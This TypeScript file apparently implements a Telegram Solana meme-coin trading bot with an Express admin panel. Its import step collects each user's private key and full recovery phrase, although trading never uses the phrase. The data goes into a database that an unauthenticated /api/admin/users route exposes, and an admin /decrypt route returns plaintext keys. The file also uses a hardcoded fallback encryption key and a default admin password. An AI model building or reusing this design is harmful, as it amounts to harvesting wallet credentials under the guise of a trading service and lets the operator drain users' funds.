import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { Telegraf, Context, Markup } from "telegraf";
import Database from "better-sqlite3";
import crypto from "crypto";
import * as dotenv from "dotenv";
import { Connection, PublicKey, Keypair, VersionedTransaction } from "@solana/web3.js";
import bs58 from "bs58";
import axios from "axios";

dotenv.config();

const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
const BIRDEYE_API_KEY = process.env.BIRDEYE_API_KEY;

const HELIUS_RPC_URL = HELIUS_API_KEY 
  ? `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`
  : "https://api.mainnet-beta.solana.com";

const connection = new Connection(HELIUS_RPC_URL);

async function getBirdeyePrice(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/price?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data.value;
  } catch (err) {
    console.error("Birdeye Price Error:", err);
    return null;
  }
}

async function getBirdeyeTokenOverview(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/token_overview?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data;
  } catch (err) {
    console.error("Birdeye Overview Error:", err);
    return null;
  }
}

const app = express();
const PORT = 3000;
const db = new Database("bot.db");

// --- Database Setup ---
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id BIGINT UNIQUE,
    username TEXT,
    wallet_address TEXT,
    recovery_phrase TEXT,
    private_key TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  
  CREATE TABLE IF NOT EXISTS trades (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    token TEXT,
    amount REAL,
    price REAL,
    type TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
`);

// --- Encryption Logic ---
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "default-32-char-key-for-dev-only!!"; // Must be 32 chars
const IV_LENGTH = 16;

function encrypt(text: string) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

function decrypt(text: string) {
  const textParts = text.split(":");
  const iv = Buffer.from(textParts.shift()!, "hex");
  const encryptedText = Buffer.from(textParts.join(":"), "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

// --- Telegram Bot Setup ---
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const bot = new Telegraf(botToken || "DUMMY_TOKEN");

// --- Telegram Bot UI Helpers ---
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback("💼 Wallet", "menu_wallet"), Markup.button.callback("📈 Trade", "menu_trade")],
  [Markup.button.callback("📊 Portfolio", "menu_portfolio"), Markup.button.callback("📉 Market", "menu_market")],
  [Markup.button.callback("⚙️ Settings", "menu_settings"), Markup.button.callback("❓ Help", "menu_help")]
]);

const walletMenu = Markup.inlineKeyboard([
  [Markup.button.callback("➕ Import Wallet", "wallet_import"), Markup.button.callback("🆕 Create Wallet", "wallet_create")],
  [Markup.button.callback("📄 View Wallet", "wallet_view")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const tradeMenu = Markup.inlineKeyboard([
  [Markup.button.callback("🟢 Buy Token", "trade_buy"), Markup.button.callback("🔴 Sell Token", "trade_sell")],
  [Markup.button.callback("📥 Enter Contract Address", "trade_contract")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const portfolioMenu = Markup.inlineKeyboard([
  [Markup.button.callback("💰 View Balance", "port_balance"), Markup.button.callback("🪙 Token Holdings", "port_tokens")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

const settingsMenu = Markup.inlineKeyboard([
  [Markup.button.callback("⚙️ Slippage Settings", "set_slippage"), Markup.button.callback("🔐 Wallet Settings", "set_wallet")],
  [Markup.button.callback("🔙 Back", "menu_main")]
]);

if (botToken) {
  bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
      "*Welcome to Solana Elite Trading Bot*\n\n" +
      "The most advanced and secure way to trade Solana meme coins directly from Telegram\\.\n\n" +
      "🚀 _Select an option from the menu below to get started_",
      mainMenu
    );
  });

  // --- Menu Navigation Handlers ---
  bot.action("menu_main", (ctx) => ctx.editMessageText("🚀 Main Menu", mainMenu));
  bot.action("menu_wallet", (ctx) => ctx.editMessageText("💼 Wallet Management", walletMenu));
  bot.action("menu_trade", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));
  bot.action("menu_portfolio", (ctx) => ctx.editMessageText("📊 Your Portfolio", portfolioMenu));
  bot.action("menu_settings", (ctx) => ctx.editMessageText("⚙️ Bot Settings", settingsMenu));
  bot.action("menu_help", (ctx) => ctx.editMessageText("❓ Need Help?\n\nContact support or check our docs for trading guides.", Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]])));

  // --- Wallet Actions ---
  bot.action("wallet_import", (ctx) => {
    ctx.reply("Please send your wallet details in the format:\nADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
  });

  bot.action("wallet_view", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("No wallet connected.");
    ctx.reply(`📄 Connected Wallet:\n\`${user.wallet_address}\``, { parse_mode: 'Markdown' });
  });

  bot.action("wallet_create", async (ctx) => {
    try {
      const kp = Keypair.generate();
      const address = kp.publicKey.toString();
      const pKey = bs58.encode(kp.secretKey);
      
      ctx.reply(`🆕 New Wallet Created!\n\nAddress: \`${address}\`\nPrivate Key: \`${pKey}\`\n\n⚠️ *SAVE THIS KEY NOW!* It will not be shown again. To use this wallet, import it using the format: ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE`, { parse_mode: 'Markdown' });
    } catch (err) {
      ctx.reply("Error creating wallet.");
    }
  });

  // --- Portfolio Actions ---
  bot.action("port_balance", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    try {
      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
      ctx.reply(`💰 SOL Balance: ${balance / 1e9} SOL`);
    } catch (err) {
      ctx.reply("Error fetching balance.");
    }
  });

  bot.action("port_tokens", (ctx) => {
    ctx.reply("Token holdings feature coming soon! Check your balance for now.");
  });

  // --- Trade Actions ---
  bot.action("trade_buy", (ctx) => ctx.reply("To buy a token, use the command:\n`/buy <TOKEN_ADDRESS> <AMOUNT_SOL>`", { parse_mode: 'Markdown' }));
  bot.action("trade_sell", (ctx) => ctx.reply("To sell a token, use the command:\n`/sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>`", { parse_mode: 'Markdown' }));
  bot.action("trade_contract", (ctx) => {
    ctx.editMessageText(
      "📥 *Enter Token Contract Address*\n\n" +
      "Please paste the Solana token contract address below to view market data and trade options.",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "trade_menu")]]) }
    );
  });

  bot.action("trade_menu", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));

  // --- Market & Settings ---
  bot.action("menu_market", (ctx) => {
    ctx.editMessageText(
      "📉 *Market Data Terminal*\n\n" +
      "Use `/price <TOKEN_ADDRESS>` to get real-time price and market data from Birdeye.\n\n" +
      "Example: `/price So11111111111111111111111111111111111111112`",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]]) }
    );
  });
  
  bot.action("set_slippage", (ctx) => {
    ctx.reply("Current slippage is set to 0.5% (50 bps). Custom slippage settings coming soon.");
  });

  bot.action("set_wallet", (ctx) => {
    ctx.reply("Wallet settings: You can disconnect or change your wallet by importing a new one.");
  });

  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    
    // Handle Wallet Import (ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE)
    if (text.includes("|")) {
      const [address, pKey, recovery] = text.split("|").map(s => s.trim());
      if (!address || !pKey || !recovery) {
        return ctx.reply("Invalid format. Use: ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
      }

      try {
        const encryptedPKey = encrypt(pKey);
        const encryptedRecovery = encrypt(recovery);

        const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase) VALUES (?, ?, ?, ?, ?)");
        stmt.run(ctx.from.id, ctx.from.username || "unknown", address, encryptedPKey, encryptedRecovery);

        ctx.reply("✅ Wallet connected successfully! Your data is encrypted.");
      } catch (err) {
        console.error(err);
        ctx.reply("❌ Error saving wallet details.");
      }
      return;
    }

    // Handle Solana Contract Address Detection
    const solanaAddrRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
    if (solanaAddrRegex.test(text)) {
      ctx.reply(`🔍 Analyzing token: ${text}...`);
      const overview = await getBirdeyeTokenOverview(text);
      
      if (overview) {
        const message = `
📊 *Token: ${overview.symbol}*
💰 Price: $${overview.price.toFixed(6)}
📈 24h: ${overview.priceChange24hPercent.toFixed(2)}%
💧 Liq: $${overview.liquidity.toLocaleString()}
🏛️ MC: $${overview.mc.toLocaleString()}

🚀 *Quick Actions:*
Buy: \`/buy ${text} 0.1\`
Sell: \`/sell ${text} 1000000\`
        `;
        
        const tradeButtons = Markup.inlineKeyboard([
          [Markup.button.callback("🟢 Buy 0.1 SOL", `quick_buy_${text}_0.1`)],
          [Markup.button.callback("🔴 Sell 50%", `quick_sell_${text}_50`)],
          [Markup.button.callback("🔙 Back", "menu_main")]
        ]);

        return ctx.reply(message, { parse_mode: 'Markdown', ...tradeButtons });
      }
    }
  });

  bot.command("price", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Usage: /price <TOKEN_ADDRESS>");
    
    const tokenAddress = args[1];
    ctx.reply(`🔍 Fetching data for ${tokenAddress}...`);

    const overview = await getBirdeyeTokenOverview(tokenAddress);
    if (!overview) return ctx.reply("❌ Could not fetch token data. Check address or API key.");

    const message = `
📊 *Token Overview: ${overview.symbol}*
💰 Price: $${overview.price.toFixed(6)}
📈 24h Change: ${overview.priceChange24hPercent.toFixed(2)}%
💧 Liquidity: $${overview.liquidity.toLocaleString()}
🏛️ Market Cap: $${overview.mc.toLocaleString()}
📜 Address: \`${tokenAddress}\`
    `;
    ctx.reply(message, { parse_mode: 'Markdown' });
  });

  // --- Trading Functions ---
  async function executeBuy(ctx: any, tokenAddress: string, amountSol: number) {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    ctx.reply(`🔄 Attempting to buy ${amountSol} SOL worth of token...`);

    try {
      const pKey = decrypt(user.private_key);
      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));

      // 1. Get Quote from Jupiter
      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${tokenAddress}&amount=${Math.floor(amountSol * 1e9)}&slippageBps=50`);
      const quoteData = quoteResponse.data;

      // 2. Get Swap Transaction
      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
        quoteResponse: quoteData,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
      });

      // 3. Sign and Send
      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      transaction.sign([wallet]);
      
      const txid = await connection.sendRawTransaction(transaction.serialize(), {
        skipPreflight: true,
        maxRetries: 2
      });

      ctx.reply(`✅ Buy Order Sent!\nTX: https://solscan.io/tx/${txid}`);
      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountSol, 'buy');
    } catch (err: any) {
      console.error(err);
      ctx.reply(`❌ Trade Failed: ${err.message}`);
    }
  }

  async function executeSell(ctx: any, tokenAddress: string, amountToken: string) {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    ctx.reply(`🔄 Attempting to sell token for SOL...`);

    try {
      const pKey = decrypt(user.private_key);
      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));

      // 1. Get Quote (Token -> SOL)
      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=${tokenAddress}&outputMint=So11111111111111111111111111111111111111112&amount=${amountToken}&slippageBps=100`);
      const quoteData = quoteResponse.data;

      // 2. Get Swap Transaction
      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
        quoteResponse: quoteData,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
      });

      // 3. Sign and Send
      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      transaction.sign([wallet]);
      
      const txid = await connection.sendRawTransaction(transaction.serialize(), {
        skipPreflight: true,
        maxRetries: 2
      });

      ctx.reply(`✅ Sell Order Sent!\nTX: https://solscan.io/tx/${txid}`);
      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountToken, 'sell');
    } catch (err: any) {
      console.error(err);
      ctx.reply(`❌ Trade Failed: ${err.message}`);
    }
  }

  // --- Quick Action Handlers ---
  bot.action(/^quick_buy_(.+)_(.+)$/, async (ctx) => {
    const tokenAddress = ctx.match[1];
    const amountSol = parseFloat(ctx.match[2]);
    await executeBuy(ctx, tokenAddress, amountSol);
  });

  bot.action(/^quick_sell_(.+)_(.+)$/, async (ctx) => {
    const tokenAddress = ctx.match[1];
    const percentage = parseInt(ctx.match[2]);
    
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");

    try {
      // Get token balance for the user
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(user.wallet_address), {
        mint: new PublicKey(tokenAddress)
      });
      
      if (tokenAccounts.value.length === 0) return ctx.reply("❌ You don't hold this token.");
      
      const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.amount;
      const amountToSell = Math.floor(parseInt(balance) * (percentage / 100)).toString();
      
      await executeSell(ctx, tokenAddress, amountToSell);
    } catch (err) {
      ctx.reply("❌ Error calculating balance for sell.");
    }
  });

  // --- Trading Logic (Jupiter API) ---
  bot.command("buy", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply("Usage: /buy <TOKEN_ADDRESS> <AMOUNT_SOL>");
    await executeBuy(ctx, args[1], parseFloat(args[2]));
  });

  bot.command("sell", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply("Usage: /sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>");
    await executeSell(ctx, args[1], args[2]);
  });

  // Clear webhook and launch with a small delay to prevent 409 Conflict on restarts
  setTimeout(async () => {
    try {
      await bot.telegram.deleteWebhook({ drop_pending_updates: true });
      await bot.launch();
      console.log("🚀 Telegram Bot started");
    } catch (err: any) {
      if (err.message.includes("409")) {
        console.warn("⚠️ Bot conflict detected. This usually happens during rapid restarts. The other instance should terminate shortly.");
      } else {
        console.error("❌ Failed to start Telegram Bot:", err.message);
      }
    }
  }, 2000);

  // Enable graceful stop
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
} else {
  console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing. Bot features are disabled.");
}

// --- Express API Routes ---
app.use(express.json());

app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  const expectedPassword = process.env.ADMIN_PASSWORD || "admin123";
  
  console.log(`[Admin] Login attempt. Expected: ${expectedPassword ? 'SET' : 'NOT SET'}`);
  
  if (password === expectedPassword) {
    console.log("[Admin] Login successful");
    res.json({ success: true });
  } else {
    console.warn("[Admin] Login failed: Incorrect password");
    res.status(401).json({ success: false });
  }
});

app.get("/api/admin/users", (req, res) => {
  const users = db.prepare("SELECT * FROM users ORDER BY created_at DESC").all();
  res.json(users);
});

app.get("/api/admin/trades", (req, res) => {
  const trades = db.prepare(`
    SELECT t.*, u.username 
    FROM trades t 
    JOIN users u ON t.user_id = u.id 
    ORDER BY t.timestamp DESC 
    LIMIT 50
  `).all();
  res.json(trades);
});

app.post("/api/admin/broadcast", async (req, res) => {
  const { message, password } = req.body;
  if (password !== (process.env.ADMIN_PASSWORD || "admin123")) return res.status(401).send("Unauthorized");
  
  if (!botToken) return res.status(500).json({ error: "Bot not initialized" });

  const users = db.prepare("SELECT telegram_id FROM users").all() as any[];
  let successCount = 0;
  let failCount = 0;

  for (const user of users) {
    try {
      await bot.telegram.sendMessage(user.telegram_id, message);
      successCount++;
    } catch (err) {
      console.error(`Failed to send message to ${user.telegram_id}:`, err);
      failCount++;
    }
  }

  res.json({ success: true, successCount, failCount });
});

app.post("/api/admin/decrypt", (req, res) => {
  const { encryptedText, password } = req.body;
  if (password !== process.env.ADMIN_PASSWORD) return res.status(401).send("Unauthorized");
  
  try {
    const decrypted = decrypt(encryptedText);
    res.json({ decrypted });
  } catch (err) {
    res.status(400).json({ error: "Decryption failed" });
  }
});

app.get("/api/admin/stats", (req, res) => {
  const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
  const tradeCount = db.prepare("SELECT COUNT(*) as count FROM trades").get() as any;
  res.json({ users: userCount.count, trades: tradeCount.count });
});

// --- Vite Middleware ---
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
